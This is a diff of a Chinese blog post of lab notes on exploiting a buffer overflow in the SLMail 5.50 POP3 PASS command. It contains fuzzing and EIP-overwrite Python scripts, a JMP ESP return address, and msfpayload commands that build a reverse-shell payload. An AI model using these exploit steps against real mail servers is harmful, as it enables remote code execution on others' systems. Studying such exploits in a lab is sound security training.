@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="FUZZER（window缓存区溢出）  SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead） ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0） mona.py（Github上下载）     window上看开启的服务 1.netstat -nao（cmd） 2.se">
+<meta name="description" content="1. FUZZER（window缓存区溢出） SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead） ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0） mona.py（Github上下载）   window上看开启的服务 1.netstat -nao（cmd） 2.ser">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Kali Linux笔记(二十七)：Window缓冲区溢出">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;11&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="FUZZER（window缓存区溢出）  SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead） ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0） mona.py（Github上下载）     window上看开启的服务 1.netstat -nao（cmd） 2.se">
+<meta property="og:description" content="1. FUZZER（window缓存区溢出） SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead） ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0） mona.py（Github上下载）   window上看开启的服务 1.netstat -nao（cmd） 2.ser">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-13T11:59:55.102Z">
+<meta property="og:updated_time" content="2020-01-05T02:50:50.820Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -333,15 +333,11 @@
 
       
         <hr>
-<ol>
-<li><p>FUZZER（window缓存区溢出）</p>
-<ul>
+<h4 id="1-FUZZER（window缓存区溢出）"><a href="#1-FUZZER（window缓存区溢出）" class="headerlink" title="1. FUZZER（window缓存区溢出）"></a>1. FUZZER（window缓存区溢出）</h4><ul>
 <li>SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead）</li>
 <li>ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0）</li>
 <li>mona.py（Github上下载）</li>
 </ul>
-</li>
-</ol>
 <blockquote>
 <pre><code>window上看开启的服务
 1.netstat -nao（cmd）
@@ -349,9 +345,7 @@
 <blockquote>
 <pre><code>mona.py放在ImmunityDebugger中
 右键 → 查找目标 → PyCommonds → 拷贝mona.py</code></pre></blockquote>
-<ol start="2">
-<li><p>FUZZER</p>
-<ul>
+<h4 id="2-FUZZER"><a href="#2-FUZZER" class="headerlink" title="2. FUZZER"></a>2. FUZZER</h4><ul>
 <li>SLMail 5.50 Mail Server（不同端口开的不同服务，都有不同指令可以向服务器提交数据）<ul>
 <li>POP3 PASS命令存在缓存区溢出漏洞（nc SMTP or POP3,shell code进行试探)</li>
 <li>无需身份验证实现远程代码执行</li>
@@ -360,13 +354,10 @@
 </ul>
 </li>
 </ul>
-</li>
-</ol>
 <blockquote>
 <pre><code>在Kali端，向右键服务器发送大量命令组合的字符串（如：USER;ls）
 在window xp端，用ImmunityDebugger查看在发送命令时是否会出现缓冲区溢出</code></pre></blockquote>
-<ol start="3">
-<li>POP3<ul>
+<h4 id="3-POP3"><a href="#3-POP3" class="headerlink" title="3. POP3"></a>3. POP3</h4><ul>
 <li>nc IP地址 110端口</li>
 <li>了解未知协议<ul>
 <li>Wireshark（抓包分析学习）</li>
@@ -375,33 +366,23 @@
 </li>
 <li><strong><code>🔺命令：./01.py</code></strong>（测试是否能连接POP3服务器）</li>
 </ul>
-</li>
-</ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&apos;IP地址&apos;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;USER yuanfh&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;PASS test\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
 
-<ol start="4">
-<li><p>FUZZING</p>
-<ul>
+<h4 id="4-FUZZING"><a href="#4-FUZZING" class="headerlink" title="4. FUZZING"></a>4. FUZZING</h4><ul>
 <li>测试PASS命令接收到大量数据是否会溢出（需要发送的数据大于缓冲区）</li>
 <li>EIP寄存器存放下一条指令的地址（首先关注EIP，ESP，EDP，可使指向shell code的地址）</li>
 <li><strong><code>🔺命令：./02.py</code></strong></li>
 </ul>
-</li>
-</ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buffer=[&apos;A&apos;]</span><br><span class="line">counter=100</span><br><span class="line">while len(buffer)&lt;=50:</span><br><span class="line">    buffer.append(&quot;A&quot;*counter)</span><br><span class="line">    counter=counter+200</span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing PASS with %s bytes&quot;%len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect=s.connect((&apos;IP地址&apos;,110))</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos;+string+&apos;\r\n&apos;)</span><br><span class="line">    s.send(&apos;QUIT\r\n&apos;)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <pre><code>ImmunityDebugger调试（记录程序的运行状态，为中间数据的拦截、记录）：
 1.Open → 打开一个静态的exe文件
 2.Attack → 正在运行的程序（通过PID区attack，attack会使进程停止，需点击开始）</code></pre></blockquote>
-<ol start="5">
-<li><p>FUZZING</p>
-<ul>
+<h4 id="5-FUZZING"><a href="#5-FUZZING" class="headerlink" title="5. FUZZING"></a>5. FUZZING</h4><ul>
 <li>2700个字符实现EIP寄存器溢出</li>
 <li><strong><code>🔺命令：./03.py</code></strong></li>
 </ul>
-</li>
-</ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2700</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
 
 <ul>
@@ -428,9 +409,7 @@
 <pre><code>window系统为小端存储形式，低位高地址，高位低地址
 EIP为4个十六进制的数字，可通过ASCII换算成字符串
 ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码</code></pre></blockquote>
-<ol start="6">
-<li><p>FUZZING</p>
-<ul>
+<h4 id="6-FUZZING"><a href="#6-FUZZING" class="headerlink" title="6. FUZZING"></a>6. FUZZING</h4><ul>
 <li>思路：<ul>
 <li>将EIP修改为Shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到Shellcode代码段并执行</li>
 </ul>
@@ -438,14 +417,10 @@ ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码<
 <li>寻找可存放Shellcode的内容空间</li>
 <li><strong><code>🔺命令：./06.py</code></strong>（查看ESP寄存器可存放多少个字符）</li>
 </ul>
-</li>
-</ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+&apos;C&apos;*(3500-2607-4)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
 
 
-<ol start="7">
-<li><p>FUZZING</p>
-<ul>
+<h4 id="7-FUZZING"><a href="#7-FUZZING" class="headerlink" title="7. FUZZING"></a>7. FUZZING</h4><ul>
 <li>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途<ul>
 <li>返回地址、Shellcode、buffer中都不能出现坏字符</li>
 <li>null byte（0x00）空字符，用于终止字符串拷贝的操作</li>
@@ -458,15 +433,11 @@ ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码<
 </ul>
 </li>
 </ul>
-</li>
-</ol>
 <blockquote>
 <pre><code>字符传进寄存器，可能会被过滤，也可能使服务端carsh</code></pre></blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=&#123;&#125;</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+badchars</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
 
-<ol start="8">
-<li><p>FUZZING</p>
-<ul>
+<h4 id="8-FUZZING"><a href="#8-FUZZING" class="headerlink" title="8. FUZZING"></a>8. FUZZING</h4><ul>
 <li>重定向数据流<ul>
 <li>用ESP的地址替换EIP的值</li>
 <li>但是ESP地址变化，硬编码不可行（每次操作系统随机分配）</li>
@@ -482,16 +453,12 @@ ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码<
 </ul>
 </li>
 </ul>
-</li>
-<li><p>FUZZING</p>
-<ul>
+<h4 id="9-FUZZING"><a href="#9-FUZZING" class="headerlink" title="9. FUZZING"></a>9. FUZZING</h4><ul>
 <li>寻找不受保护的系统模块<ul>
 <li>!mona modules</li>
 </ul>
 </li>
 </ul>
-</li>
-</ol>
 <blockquote>
 <pre><code>Rebase：操作系统重启，内存地址是否发生变化，基地址变化，为False
 SafeSEH、ASLR：操作系统提供的内存保护机制，为False
@@ -532,9 +499,7 @@ Memory Map内存地址图查看模块对应的基地址是否收到DEP,ALSR的�
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;C&apos;*390</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
 
-<ol start="10">
-<li><p>FUZZING </p>
-<ul>
+<h4 id="10-FUZZING"><a href="#10-FUZZING" class="headerlink" title="10. FUZZING"></a>10. FUZZING</h4><ul>
 <li>生成Shellcode（注意坏字符）</li>
 <li>Scratch（写Shellcode的工具）</li>
 <li>cd /usr/share/framework2</li>
@@ -542,8 +507,6 @@ Memory Map内存地址图查看模块对应的基地址是否收到DEP,ALSR的�
 <li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=反向IP地址 LPORT=反向端口 C</code></strong></li>
 <li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=IP地址 LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong>（最后需要用”+”进行连接）</li>
 </ul>
-</li>
-</ol>
 <blockquote>
 <pre><code>win32_adduser 增加用户的Shellcode
 win32_bind    增加监听的进程，可以开启相应的端口
@@ -558,9 +521,7 @@ win32_bind    增加监听的进程，可以开启相应的端口
 
 <blockquote>
 <pre><code>汇编语言的\0x90，表示NOP（不操作），为了保证Shellcode运行有效性，从经验上来谈，CPU在跳转解析的时候，可能会擦除，覆盖Shellcode的前几个字符，所以需要加NOP进行不操作</code></pre></blockquote>
-<ol start="11">
-<li><p>FUZZING</p>
-<ul>
+<h4 id="11-FUZZING"><a href="#11-FUZZING" class="headerlink" title="11. FUZZING"></a>11. FUZZING</h4><ul>
 <li>早期的msfpayload<ul>
 <li>Shellcode执行后会一ExitProcess方式退出整个进程，将导致邮件服务崩溃</li>
 <li>SLMail是一个基于线程的应用，适用ExitThread方式可以避免整个系统崩溃，可实现重复溢出</li>
@@ -568,11 +529,7 @@ win32_bind    增加监听的进程，可以开启相应的端口
 </ul>
 </li>
 </ul>
-</li>
-<li><p>FUZZING</p>
-</li>
-</ol>
-<blockquote>
+<h4 id="12-FUZZING"><a href="#12-FUZZING" class="headerlink" title="12. FUZZING"></a>12. FUZZING</h4><blockquote>
 <pre><code>1.修改注册表开启远程桌面控制后需重启计算机（shutdown -r -t 0）
 2.查看远程桌面是否开启（我的电脑 → 属性 → 远程）
 3.apt-get install rdesktop
@@ -674,8 +631,17 @@ win32_bind    增加监听的进程，可以开启相应的端口
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -755,6 +721,22 @@ win32_bind    增加监听的进程，可以开启相应的端口
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-FUZZER（window缓存区溢出）"><span class="nav-number">1.</span> <span class="nav-text">1. FUZZER（window缓存区溢出）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-FUZZER"><span class="nav-number">2.</span> <span class="nav-text">2. FUZZER</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-POP3"><span class="nav-number">3.</span> <span class="nav-text">3. POP3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-FUZZING"><span class="nav-number">4.</span> <span class="nav-text">4. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-FUZZING"><span class="nav-number">5.</span> <span class="nav-text">5. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-FUZZING"><span class="nav-number">6.</span> <span class="nav-text">6. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-FUZZING"><span class="nav-number">7.</span> <span class="nav-text">7. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-FUZZING"><span class="nav-number">8.</span> <span class="nav-text">8. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-FUZZING"><span class="nav-number">9.</span> <span class="nav-text">9. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-FUZZING"><span class="nav-number">10.</span> <span class="nav-text">10. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11-FUZZING"><span class="nav-number">11.</span> <span class="nav-text">11. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-FUZZING"><span class="nav-number">12.</span> <span class="nav-text">12. FUZZING</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
